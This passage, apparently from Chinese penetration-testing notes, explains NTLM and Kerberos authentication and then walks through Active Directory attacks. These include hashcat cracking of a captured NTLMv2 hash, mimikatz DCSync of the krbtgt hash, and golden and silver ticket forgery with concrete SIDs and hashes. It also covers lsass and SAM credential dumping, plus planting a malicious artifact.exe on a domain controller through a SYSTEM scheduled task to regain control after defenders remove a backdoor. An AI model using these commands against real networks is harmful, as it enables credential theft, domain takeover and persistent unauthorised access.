的网络认证协议。</p>\n<p>它主要分为协商、质询和验证三个步骤：</p>\n<blockquote>\n<p>协商，这个是为了解决历史遗留问题，也就是为了向下兼容，双方先确定一下传输协议的版本等各种信息。</p>\n<p>质询，这一步便是 Chalenge/Response 认证机制的关键之处，下面会介绍这里的步骤。</p>\n<p>验证，对质询的最后结果进行一个验证，验证通过后，即允许访问资源</p>\n</blockquote>\n<p>认证流程<br>\n 1、首先，client 会向 server 发送一个 username，这个 username 是存在于 server 上的一个用户</p>\n<p>2、首先会在本地查询是否存在这样的一个用户，如果存在，将会生成一个 16 位的随机字符，即 Chalenge，然后用查询到的这个 user 的 NTLM hash 对 Chalenge 进行加密，生成 Chalenge1，将 Chalenge1 存储在本地，并将 Chalenge 传给 client。</p>\n<p>认证失败</p>\n<p>1、首先，client 会向 server 发送一个 username，这个 username 是存在于 server 上的一个用户</p>\n<p>2、当 server 接收到这个信息时，首先会在本地查询是否存在这样的一个用户，如果不存在，则直接返回认证失败</p>\n<p>3、当 client 接收到 Chalenge 时，将发送的 username 所对应的 NTLM hash 对 Chalenge 进行加密即 Response，并 Response 发送给 server。</p>\n<p>4、server 在收到 Response 后，将其与 Chalenge1 进行比较，如果相同，则验证成功</p>\n<p>NTLM v1 的 Challenge 有 8 位，NTLM v1 的主要加密算法是 DES</p>\n<p>NTLM v2 的 Challenge 为 16 位；NTLM v2 的主要加密算法是 HMAC‐MD5。</p>\n<p><code>net use \\\\192.168.41.130 /u:kkk Admin@123</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205140859339.png\" alt=\"image-20221205140859339\"></p>\n<p>NTLMv2 格式如下：</p>\n<p>username::domain:challenge:HMAC‐MD5:blob</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username：对应数据包中 user name</span><br><span class=\"line\">domain:对应数据包中的 Domain name</span><br><span class=\"line\">HMAC‐MD5：对应数据包中的NTProofStr</span><br><span class=\"line\">blob：数据库包中rsponse去掉HMAC‐MD5的值</span><br></pre></td></tr></table></figure>\n<p>使用 hashcat 破解密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat ‐m 5600kkk:::53fb7eb8d40cc777:3d00ee8a5618f85651098b8005883d5c:0101000000000000f790f7af9b92d8019cba65f5e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e0042004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d801060004000200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391df48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340031002e003100330030000000000000000000 1.txt ‐‐force</span><br></pre></td></tr></table></figure>\n<p>抓取 NTLMV2：Inveigh-master</p>\n<h3 id=\"kerberos认证\"><a class=\"markdownIt-Anchor\" href=\"#kerberos认证\">#</a> Kerberos 认证</h3>\n<p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的</p>\n<p>kerberos 协议中也存在三个角色，分别是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">客户端（client）：发送请求的一方</span><br><span class=\"line\">服务端（Server）：接收请求的一方</span><br><span class=\"line\">密钥分发中心（Key Distribution Center，KDC），而密钥分发中心一般又分为两部分，分别是：</span><br><span class=\"line\">AS（Authentication Server）：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据授予票据）</span><br><span class=\"line\">TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（Ticket）</span><br></pre></td></tr></table></figure>\n<p>所以整个 kerberos 认证流程可以简化描述如下： 客户端在访问每个想要访问的网络服务时，他需要携带一个专门用于访问该服务并且能够证明自己身份的票据，当服务端收到了该票据他才能认定客户端身份正确，向客户端提供服务。所以整个认证流程可简化为两大步：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、客户端向KDC请求获取想要访问的目标服务的服务授予票据（Ticket）；</span><br><span class=\"line\">2、客户端拿着从KDC获取的服务授予票据（Ticket）访问相应的网络服务；</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205143756973.png\" alt=\"image-20221205143756973\"></p>\n<p>所以 kerberos 通信可以分为 3 步，我们逐步详解</p>\n<p><strong>通信第一步客户端和 AS 进行通信</strong></p>\n<p>为了获得能够用来访问服务端服务的票据，客户端首先需要来到 KDC 获得服务授予票据（Ticket）。由于客户端是第一次访问 KDC，此时 KDC 也不确定该客户端的身份，所以第一次通信的目的为 KDC 认证客户端身份，确认客户端是一个可靠且拥有访问 KDC 权限的客户端，</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205144558462.png\" alt=\"image-20221205144558462\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳；</span><br><span class=\"line\">2、KDC当中的AS（Authentication Server）接收请求（AS是KDC中专门用来认证客户端身份的认证服务器）后去kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性；</span><br><span class=\"line\">3、如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回响应给客户端，其中包含两部分内容：</span><br><span class=\"line\">3.1、第一部分内容称为TGT，他叫做票据授予票据，客户端需要使用TGT去KDC中的TGS（票据授予中心）获取访问网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该客户端的Name，IP，当前时间戳，客户端即将访问的TGS的Name，TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)。整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。</span><br><span class=\"line\">3.2第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。至此，第一次通信完成。</span><br></pre></td></tr></table></figure>\n<p><strong>通信第二步客户端和 TGS 进行通信</strong></p>\n<p>此时的客户端收到了来自 KDC（其实是 AS）的响应，并获取到了其中的两部分内容。此时客户端会用自己的密钥将第二部分内容进行解密，分别获得时间戳，自己将要访问的 TGS 的信息，和用于与 TGS 通信时的密钥 CT_SK。首先他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于 5 分钟，如果大于五分钟则认为该 AS 是伪造的，认证至此失败。如果时间戳合理，客户端便准备向 TGS 发起请求</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205145435423.png\" alt=\"image-20221205145435423\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">客户端行为：</span><br><span class=\"line\">1、客户端使用CT_SK加密将自己的客户端信息发送给KDC，其中包括客户端名，IP，时间戳；</span><br><span class=\"line\">2、客户端将自己想要访问的Server服务以明文的方式发送给KDC；</span><br><span class=\"line\">3、客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；</span><br><span class=\"line\">TGS行为：</span><br><span class=\"line\">1、此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的Server服务IP查看当前kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束，。如果存在，继续接下来的认证。</span><br><span class=\"line\">2、TGS使用自己的密钥将TGT中的内容进行解密，此时他看到了经过AS认证过后并记录的用户信息，一把Session_KEY即CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。</span><br><span class=\"line\">3、如果时延正常，则TGS会使用CT_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。</span><br><span class=\"line\">4、此时KDC将返回响应给客户端，响应内容包括：</span><br><span class=\"line\">第一部分：用于客户端访问网络服务的使用Server密码加密的ST（Servre Ticket），其中包括客户端的Name，IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信CS_SK（SessionKey）。</span><br><span class=\"line\">第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，AS已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。</span><br><span class=\"line\">至此，第二次通信完成。</span><br></pre></td></tr></table></figure>\n<p><strong>通信第三步客户端和服务端进行通信</strong></p>\n<p>此时的客户端收到了来自 KDC（TGS）的响应，并使用缓存在本地的 CT_SK 解密了第二部分内容（第一部分内容中的 ST 是由 Server 密码加密的，客户端无法解密），检查时间戳无误后取出其中的 CS_SK 准备向服务端发起最后的请求。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205150740295.png\" alt=\"image-20221205150740295\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">客户端：</span><br><span class=\"line\">1、客户端使用CS_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）作为第二部分内容都发送给服务端。</span><br><span class=\"line\">服务端：</span><br><span class=\"line\">1、服务器此时收到了来自客户端的请求，他会使用自己的密钥，即Server密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会使用数字证书证明自己身份）。</span><br><span class=\"line\">至此，第三次通信完成。此时也代表着整个kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的</span><br><span class=\"line\">进行整个网络通信了。</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205151142934.png\" alt=\"image-20221205151142934\"></p>\n<h3 id=\"黄金票据\"><a class=\"markdownIt-Anchor\" href=\"#黄金票据\">#</a> 黄金票据</h3>\n<p><strong>权限维持的技术！！</strong></p>\n<p>krbtgt 用户，是系统在创建域时自动生成的一个帐号，其作用是密钥分发中心的服务账号，其密码是系统随机生成的，无法登录主机</p>\n<p>TGT=Krbtgt 的 html hash 加密</p>\n<p>1、Kerberos 中的 TGT 和 Logon Session Key（CT_SK）是 AS 返回的 ，TGP 它是由 Krbtgt 加密和签名的，krbtgt 的 NTLM Hash 又是固定的，而 CT_SK 并不会保存在 KDC 中。</p>\n<p>2、所以只要得到 krbtgt 的 NTLM Hash，就可以伪造 TGT 和 Logon Session Key（CT_SK）。</p>\n<p>3、Client 与 TGS 的交互中，而已有了金票后（TGT）, 就跳过 AS 验证，不用验证账户和密码，所以也不担心域管密码修改。</p>\n<p>当我们获得域控的控制权限后，有可能获取域内所有用户的 hash，和 krbtgt 的 hash。这时，由于一些原因导致我们失去对目标的控制权，但是我们还留有一个普通用户的权限，并且 krbtgt 的密码没有更改，此时我们可以利用 krbtgt 用户的 ntlm hash 制作黄金票据伪造 TGT，重新获取域控的管理权限。</p>\n<p>实现前提</p>\n<p>1、已经控制了域名并且使用域管理员登录或者提权的 system</p>\n<p>如果域管理员发现了你控制了域控机器，把你的后门删除了，那么就不能继续控制域控了，这个时候当我们可以伪</p>\n<p>造 TGT 重新获得域控的权限</p>\n<p>条件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、域名称</span><br><span class=\"line\">2、域的SID值</span><br><span class=\"line\">3、域的KRBTGT账号的HASH</span><br><span class=\"line\">4、伪造任意用户名</span><br><span class=\"line\">（获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell whoami /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)</span><br><span class=\"line\">shell net config workstation 查看域</span><br></pre></td></tr></table></figure>\n<p>3、使用 mimikatz 导出 KRBTGT 的 ntlm hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz lsadump::dcsync /domain:hack.com /user:krbtgt</span><br></pre></td></tr></table></figure>\n<p>因为之前已经记录了关键信息，我们现在就可以伪造任意用户访问域控，windows 2008 机器必须是域内用户或者 system 用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::tgt 查票</span><br><span class=\"line\">mimikatz kerberos::purge 清票</span><br></pre></td></tr></table></figure>\n<p>使用计划任务上线 cs</p>\n<p>copy 恶意文件到域控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell copy c:\\users\\administrator\\desktop\\artifact.exe \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p>设置计划任务到域控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\\artifact.exe /ru system /f</span><br><span class=\"line\"></span><br><span class=\"line\">shell schtasks /run /s dc.hack.com /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"白银票据\"><a class=\"markdownIt-Anchor\" href=\"#白银票据\">#</a> 白银票据</h3>\n<p>服务账号就是计算机名字 +$ 用来管理服务的账号</p>\n<p>如果说黄金票据是伪造的 TGT, 那么白银票据就是伪造的 ST。 在 Kerberos 认证的第三部，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后，通过自己的 Master Key 解密 ST, 从而获得 Session Key。通过 Session Key 解密 Authenticator3, 进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。所以我们只需要知道 Server 用户的 Hash 就可以伪造出一个 ST, 且不会经过 KDC, 但是伪造的门票只对部分服务起作用。</p>\n<p>条件如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.域名</span><br><span class=\"line\">2.域sid</span><br><span class=\"line\">3.目标服务器名</span><br><span class=\"line\">4.可利用的服务</span><br><span class=\"line\">5.服务账号的NTML HASH</span><br><span class=\"line\">6.需要伪造的用户名</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205180237718.png\" alt=\"image-20221205180237718\"></p>\n<p>3、伪造票据（CIFS 共享服务）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz sekurlsa::logonpasswords</span><br><span class=\"line\">mimikatz kerberos::tgt 查票</span><br><span class=\"line\">mimikatz kerberos::purge 清票</span><br><span class=\"line\">shell klist 查票</span><br><span class=\"line\">shell klist purge 清票</span><br><span class=\"line\">mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185 /target:dc.hack.com /service:cifs /rc4:26a703eba507e848825615316bc880a1 /user:abcd /ptt</span><br><span class=\"line\">mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185 /target:dc.hack.com /service:LDAP /rc4:26a703eba507e848825615316bc880a1 /user:abcd /ptt</span><br><span class=\"line\">mimikatz lsadump::dcsync /dc:dc.hack.com /domain:hack.com /user:krbtgt</span><br></pre></td></tr></table></figure>\n<h3 id=\"sam文件密码抓取\"><a class=\"markdownIt-Anchor\" href=\"#sam文件密码抓取\">#</a> SAM 文件密码抓取</h3>\n<p>本地密码：</p>\n<p>1. 读 SAM 文件 (密文)</p>\n<p>2. 读 lsass 进程（明文）</p>\n<p><strong>Mimikatz 介绍</strong></p>\n<p>Mimikatz 是法国人 benjamin 开发的一款功能强大的轻量级调试工具，但由于其功能强大，能够直接读取 WindowsXP-2012 等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，mimikatz 可以从内存中提取明文密码、哈希、PIN 码和 kerberos 票证。 mimikatz 还可以执行哈希传递、票证传递或构建黄金票证</p>\n<p>几个常用的模块</p>\n<p>sekurlsa 模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">privilege模块</span><br><span class=\"line\">privilege::debug 提升为debug权限</span><br><span class=\"line\">sekurlsa：模块，从lsass进程中提取passwords、keys、pin、tickets等信息</span><br><span class=\"line\">sekurlsa::msv 获取HASH (LM,NTLM)</span><br><span class=\"line\">sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码</span><br><span class=\"line\">sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码</span><br><span class=\"line\">sekurlsa::tspkg 通过tspkg读取明文密码</span><br><span class=\"line\">sekurlsa::livessp 通过livessp 读取明文密码</span><br><span class=\"line\">sekurlsa::ssp 通过ssp 读取明文密码</span><br><span class=\"line\">sekurlsa::logonPasswords 通过以上各种方法读取明文密码</span><br><span class=\"line\">sekurlsa::process 将自己的进程切换到lsass进程中，之前只是注入读取信息</span><br><span class=\"line\">sekurlsa::minidump file 这个模块可以读取已经打包的内存信息</span><br><span class=\"line\">sekurlsa::pth 哈希传递</span><br><span class=\"line\">sekurlsa::pth /user:administrator/domain:host1 /ntlm:cdf34cda4e455232323xxxx</span><br><span class=\"line\">sekurlsa::pth /user:administrator/domain:host1 /aes256:cdf34cda4e455232323xxxx</span><br></pre></td></tr></table></figure>\n<p>cs 中执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure>\n<p>或者 cs 中有内置 mimikatz 直接执行 logonPasswords</p>\n<p>process 模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process::list 列出进程列表</span><br><span class=\"line\">process::exports 导出进程列表</span><br><span class=\"line\">process::imports 导入列表</span><br><span class=\"line\">process::start 开始一个进程</span><br><span class=\"line\">process::stop 停止一个程序</span><br><span class=\"line\">process::suspend 冻结一个进程</span><br><span class=\"line\">process::resume 从冻结中恢复</span><br><span class=\"line\">process::run notepad 运行一个程序</span><br><span class=\"line\">process::runp 以SYSTEM系统权限打开一个新的mimikatz窗口</span><br></pre></td></tr></table></figure>\n<p>kerberos 模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerberos::list 列出系统中的票据</span><br><span class=\"line\">kerberos::tgt 清除系统中的票据</span><br><span class=\"line\">kerberos::purge 导入票据到系统中</span><br><span class=\"line\">kerberos::ptc 票据路径</span><br></pre></td></tr></table></figure>\n<p>常用命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CRYPTO::Certificates – 列出/导出凭证。</span><br><span class=\"line\">KERBEROS::Golden – 创建黄金票证/白银票证/信任票证。</span><br><span class=\"line\">KERBEROS::List – 列出在用户的内存中所有用户的票证（TGT 和 TGS）。</span><br><span class=\"line\">KERBEROS::PTT – 票证传递。</span><br><span class=\"line\">LSADUMP::DCSync – 向 DC 发起同步一个对象（获取帐户的密码数据）的质询。</span><br><span class=\"line\">LSADUMP::LSA – 向 LSA Server 质询检索 SAM/AD 的数据（正常或未打补丁的情况下）。可以从 DC 或者是一个lsass.dmp的转储文件中导出所有的Active Directory 域凭证数据。同样也可以获取指定帐户的凭证，如 krbtgt 帐户，使用 /name 参数，如：“/name:krbtgt”。</span><br><span class=\"line\">LSADUMP::SAM ‐ 获取 SysKey 来解密 SAM 的项目数据（从注册表或者 hive 中导出）SAM 选项。可以连接到本地安全帐户管理器（SAM）数据库中并能转储本地帐户的凭证。可以用来转储在 Windows 计算机上的所有的本地凭据。</span><br><span class=\"line\">LSADUMP::Trust ‐ 向 LSA Server 质询来获取信任的认证信息（正常或未打补丁的情况下）为所有相关的受信的域或林转储信任密钥（密码）</span><br><span class=\"line\">MISC::AddSid – 将用户帐户添加到 SID 历史记录。第一个值是目标帐户，第二值是帐户/组名（可以是多个或 SID）。</span><br><span class=\"line\">MISC::MemSSP – 注入恶意的 Wndows SSP 来记录本地身份验证凭据。</span><br><span class=\"line\">MISC::Skeleton – 在 DC 中注入万能钥匙（Skeleton Key） 到 LSASS 进程中。这使得所有用户所。使用的万能钥匙修补 DC 使用 “主密码” （又名万能钥匙）以及他们自己通常使用的密码进行身份验证。</span><br><span class=\"line\">PRIVILEGE::Debug – 获得 Debug 权限（很多 Mimikatz 命令需要 Debug 权限或本地 SYSTEM 权限）。</span><br><span class=\"line\">SEKURLSA::Ekeys – 列出 Kerberos 密钥</span><br><span class=\"line\">SEKURLSA::Kerberos – 列出所有已通过认证的用户的 Kerberos 凭证（包括服务帐户和计算机帐户）。</span><br><span class=\"line\">SEKURLSA::Krbtgt – 获取域中 Kerberos 服务帐户（KRBTGT）的密码数据。</span><br><span class=\"line\">SEKURLSA::LogonPasswords – 列出所有可用的提供者的凭据。这个命令通常会显示最近登录过的用户和最近登录过的计算机的凭证。</span><br><span class=\"line\">SEKURLSA::Pth – Hash 传递 和 Key 传递（注：Over‐Pass‐the‐Hash 的实际过程就是传递了相关的 Key(s)）。</span><br><span class=\"line\">SEKURLSA::Tickets – 列出最近所有已经过身份验证的用户的可用的 Kerberos 票证，包括使用用户帐户的上下文运行的服务和本地计算机在AD 中的计算机帐户。与 kerberos::list 不同的是 sekurlsa 使用内存读取的方式，它不会受到密钥导出的限制。</span><br><span class=\"line\">TOKEN::List – 列出系统中的所有令牌。</span><br><span class=\"line\">TOKEN::Elevate – 假冒令牌。用于提升权限至 SYSTEM 权限（默认情况下）或者是发现计算机中的域管理员的令牌。</span><br><span class=\"line\">TOKEN::Elevate /domainadmin – 假冒一个拥有域管理员凭证的令牌。</span><br></pre></td></tr></table></figure>\n<h4 id=\"sam文件抓取密码\"><a class=\"markdownIt-Anchor\" href=\"#sam文件抓取密码\">#</a> SAM 文件抓取密码</h4>\n<p><strong>导出 sam 和 system 文件</strong></p>\n<p>1. 通过 reg 命令无工具导出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg save hklm\\sam sam.hive</span><br><span class=\"line\">reg save hklm\\system system.hive</span><br></pre></td></tr></table></figure>\n<p>2、通过 nishang 中的 Copy-VSS 进行复制，如果这个脚本运行在了 DC 服务器上，ntds.dit 和 SYSTEM hive 也能被拷贝出来 (或者 cs 也行)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy‐vss //直接将文件保存在当前目录下</span><br><span class=\"line\">copy‐vss ‐DestinationDir 路径 //指定保存文件的路径（必须是已经存在的路径）</span><br></pre></td></tr></table></figure>\n<p>3.<strong> 读取 sam 和 system 文件获取密码</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure>\n<h4 id=\"在线读取samlsass文件\"><a class=\"markdownIt-Anchor\" href=\"#在线读取samlsass文件\">#</a> 在线读取 sam,lsass 文件</h4>\n<p>使用 mimikatz 在线读取 sam 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">分开的命令如下</span><br><span class=\"line\">privilege::debug</span><br><span class=\"line\">token:elevate</span><br><span class=\"line\">lsadump::sam</span><br><span class=\"line\">连起来</span><br><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n<p>在线读取 lassa 文件</p>\n<p>从 lsass 进程中提取 passwords、keys、pin、tickets 等信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\">sekurlsa::msv 获取HASH (LM,NTLM)</span><br><span class=\"line\">sekurlsa::wdigest 